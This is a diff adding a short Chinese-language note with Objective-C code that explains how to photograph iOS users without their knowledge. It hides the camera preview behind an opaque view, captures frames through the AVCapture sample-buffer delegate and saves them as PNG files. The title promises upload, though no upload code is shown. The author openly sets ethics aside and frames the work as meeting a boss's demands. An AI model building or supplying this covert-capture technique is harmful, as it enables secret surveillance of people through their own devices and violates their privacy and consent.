@@ -1,0 +1,78 @@
+在用户不知道的情况下，拍照，上传
+这里不谈道德，只看技术实现。
+
+思路：
+
+1、弄个view，塞个AVCaptureVideoPreviewLayer进去，用来输出镜头图像；
+2、这个view上盖一个背景不透明的view（或其他方式），用户看不到镜头输出即可。
+3、
+通过
+AVCaptureVideoDataOutputSampleBufferDelegate
+的
+- (void)captureOutput:(AVCaptureOutput *)captureOutput didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer fromConnection:(AVCaptureConnection *)connection
+方法输出图片资源，这个时候稍加处理就可以把图片搞到手了。不要每次输出资源数据时都构造一个图片。
+
+
+
+
+需要用到：
+
+AVCaptureSession
+AVCaptureDevice
+AVCaptureDeviceInput
+AVCaptureVideoDataOutput<AVCaptureVideoDataOutputSampleBufferDelegate>
+
+
+代码片段：
+
+- (void)captureOutput:(AVCaptureOutput *)captureOutput
+didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
+       fromConnection:(AVCaptureConnection *)connection {
+    UIImage *image = [self imageFromSampleBuffer:sampleBuffer];
+    [UIImagePNGRepresentation(image) writeToFile:[dataDir() stringByAppendingPathComponent:@"1.png"] atomically:YES];
+}
+// 通过抽样缓存数据创建一个UIImage对象
+- (UIImage *) imageFromSampleBuffer:(CMSampleBufferRef) sampleBuffer
+{
+    // 为媒体数据设置一个CMSampleBuffer的Core Video图像缓存对象
+    CVImageBufferRef imageBuffer = CMSampleBufferGetImageBuffer(sampleBuffer);
+    // 锁定pixel buffer的基地址
+    CVPixelBufferLockBaseAddress(imageBuffer, 0);
+    
+    // 得到pixel buffer的基地址
+    void *baseAddress = CVPixelBufferGetBaseAddress(imageBuffer);
+    
+    // 得到pixel buffer的行字节数
+    size_t bytesPerRow = CVPixelBufferGetBytesPerRow(imageBuffer);
+    // 得到pixel buffer的宽和高
+    size_t width = CVPixelBufferGetWidth(imageBuffer);
+    size_t height = CVPixelBufferGetHeight(imageBuffer);
+    
+    // 创建一个依赖于设备的RGB颜色空间
+    CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
+    
+    // 用抽样缓存的数据创建一个位图格式的图形上下文（graphics context）对象
+    CGContextRef context = CGBitmapContextCreate(baseAddress, width, height, 8,
+                                                 bytesPerRow, colorSpace, kCGBitmapByteOrder32Little | kCGImageAlphaPremultipliedFirst);
+    // 根据这个位图context中的像素数据创建一个Quartz image对象
+    CGImageRef quartzImage = CGBitmapContextCreateImage(context);
+    // 解锁pixel buffer
+    CVPixelBufferUnlockBaseAddress(imageBuffer,0);
+    
+    // 释放context和颜色空间
+    CGContextRelease(context);
+    CGColorSpaceRelease(colorSpace);
+    
+    // 用Quartz image创建一个UIImage对象image
+    UIImage *image = [UIImage imageWithCGImage:quartzImage];
+    
+    // 释放Quartz image对象
+    CGImageRelease(quartzImage);
+    
+    return (image);  
+}
+
+
+
+满足老板需求时，尽量道德点：图像输出的代理回调时，图片不要频繁构造。
+
